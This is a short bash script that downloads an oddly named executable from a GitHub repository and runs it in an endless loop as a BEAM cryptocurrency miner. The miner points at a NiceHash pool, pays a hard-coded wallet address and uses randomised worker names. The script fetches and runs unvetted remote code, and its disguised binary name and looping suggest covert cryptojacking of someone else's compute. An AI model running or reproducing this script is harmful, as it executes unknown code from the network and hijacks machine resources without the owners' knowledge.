#!/bin/bash
#POOL= stratum+tcp://autolykos.eu-north.nicehash.com:3390
#WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo BEAM-III --pool stratum+tcp://beamv3.usa-east.nicehash.com:3387 --user 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg)
sleep 5
done
sleep 999999999
